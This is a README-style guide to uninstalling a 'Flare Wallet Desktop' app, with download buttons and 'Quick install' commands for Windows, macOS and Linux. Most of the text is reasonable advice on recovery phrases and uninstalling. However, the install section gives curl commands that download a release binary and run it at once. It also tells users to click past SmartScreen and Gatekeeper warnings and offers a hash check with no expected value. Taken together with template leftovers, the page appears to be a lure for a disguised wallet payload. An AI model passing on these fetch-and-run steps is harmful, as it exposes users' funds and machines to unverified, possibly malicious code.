![Flare Wallet](assets/banner-article.png)

# Flare Wallet Uninstall: Remove the App Without Losing the Wallet

Uninstalling is reversible when the phrase is safe, and permanent when it is not.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

Reinstalling later means the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02) and your recovery phrase; removing the application does not touch the chain.

> The application is a viewer. The wallet is the phrase, so uninstalling costs you nothing as long as the phrase is written down and tested.

Uninstalling Flare Wallet Desktop removes a program from your computer. It does not close an account, cancel a stake, or move a balance, because none of those live in the application. What it can cost you is access, and only if the recovery phrase is not backed up.

<!-- ARTICLE-BODY-BEGIN -->

## Before you remove anything

Confirm two things, in this order. First, that the recovery phrase is written down and readable. Second, that restoring from that phrase produces the address you expect. Doing both while the app is still installed means a mistake costs you five minutes instead of the balance.

The full procedure, including the restore test, is in <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-backup.md">Flare Wallet backup and restore</a>. If you have the phrase and it restores correctly, the rest of this page is housekeeping.

One thing uninstalling does not do: it does not unstake anything. A P-Chain stake locked for 14 days stays locked, and a delegation stays registered, whether or not the wallet that signed it is still installed. The locks and the reward clock are network rules; the application is just the signer.

## Windows

1. Open Settings, then Apps, then Installed apps.
2. Find Flare Wallet in the list.
3. Choose Uninstall from its menu, and confirm.

The setup program removes the application files and its Start menu entry. Your encrypted wallet file is stored separately from the program, so the uninstall leaves it in place. That is why reinstalling later shows the same wallet without a restore.

If the entry is missing from the list, the application was removed by other means, or the install did not complete. Either way, there is nothing left to uninstall in the usual sense; the wallet file is what matters.

## macOS

1. Quit the application first, with Command-Q rather than just closing the window.
2. Open Applications and drag Flare Wallet to the Trash.
3. Empty the Trash when you are sure.

Dragging to the Trash removes the application bundle. The wallet file lives in the application's data folder rather than inside the bundle, so it survives the drag, which is the behaviour you want if you plan to reinstall.

## Linux

There is no package entry to remove, because the release is a `.zip` rather than a `.deb` or `.rpm`. Uninstalling means deleting the folder you extracted, or at least the executable inside it.

1. Quit the application.
2. Delete the extraction folder, or move it somewhere out of the way if you want to keep the option of running it again.
3. Remove any desktop shortcut you created by hand.

Nothing was installed system-wide, so nothing else needs cleaning up. If you extracted into a shared location, check that you are deleting your copy rather than someone else's.

## What stays behind, and why

Your encrypted wallet file remains after all three uninstalls. That file is the local copy of the keys, protected by the password or keystore password you set. Leaving it in place is what lets a reinstall find the wallet without a restore.

The file is not the wallet, though. It is one copy of it. The phrase is what rebuilds the wallet on any machine, including one where the file never existed.

## Removing the wallet file as well

If the machine is being sold, lent or retired, leaving an encrypted key file on it is a bad habit even when the password is strong. Delete the application's data folder after confirming your phrase, and the local copy is gone.

This page does not print that folder's path, because the location depends on the build and the operating system, and a wrong path in a guide is worse than no path. Find it through the application's own settings if it exposes one, or through your system's list of application data folders, and confirm you are deleting the wallet's folder rather than a shared one.

Deleting the file is not the same as destroying the wallet. Anyone holding the phrase still controls the address, which is exactly why the phrase is the thing to protect and the file is the thing to clean up.

## Reinstalling later

Install the current release for your platform, choose restore rather than create, and enter the phrase. The same address appears with the same balance, because the address is derived from the phrase and the chain holds the state.

If the restored wallet looks empty, check the chain before assuming a failed restore: chain ID 14 is Flare mainnet. A restore onto a different network looks exactly like a wallet with nothing in it. The fields are in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-network-settings.md">Flare Wallet network settings</a>, and the install itself is in <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md">download Flare Wallet</a>.

## FAQ

### How do I uninstall Flare Wallet Desktop and keep my wallet?

Remove the application the normal way for your system, and leave the wallet file alone. On Windows use Settings, Apps, Installed apps; on macOS drag the app from Applications to the Trash; on Linux delete the folder you extracted. Your wallet stays because it is derived from the recovery phrase, not stored in the program.

### Will uninstalling delete my crypto?

No. The balance is on Flare mainnet, not on your computer. Removing the application removes your access to it from that machine, and the phrase restores access anywhere.

### Does uninstalling cancel a stake or delegation?

No. A staking lock and a delegation both live on the chain. Removing the wallet does not unlock a 14-day stake or end a delegation; it only removes the interface you were using.

### Where is the wallet file stored?

In the application's data folder, which sits apart from the installed program. This page does not publish an exact path because it varies by build and platform. Delete that folder only after confirming your phrase restores the wallet.

### Can I reinstall after uninstalling?

Yes, from the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a>. Choose restore at setup, enter the phrase, and confirm the address matches before you send anything to it.

### Do I need to uninstall the old build before installing a new one?

On Windows and macOS the installer replaces the previous application. On Linux, delete the old extracted folder so you do not run a stale executable by mistake. Either way, back up and test the restore first.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet backup and restore](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-backup.md) | [download Flare Wallet](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-download.md) | [Flare Wallet network settings](https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-network-settings.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
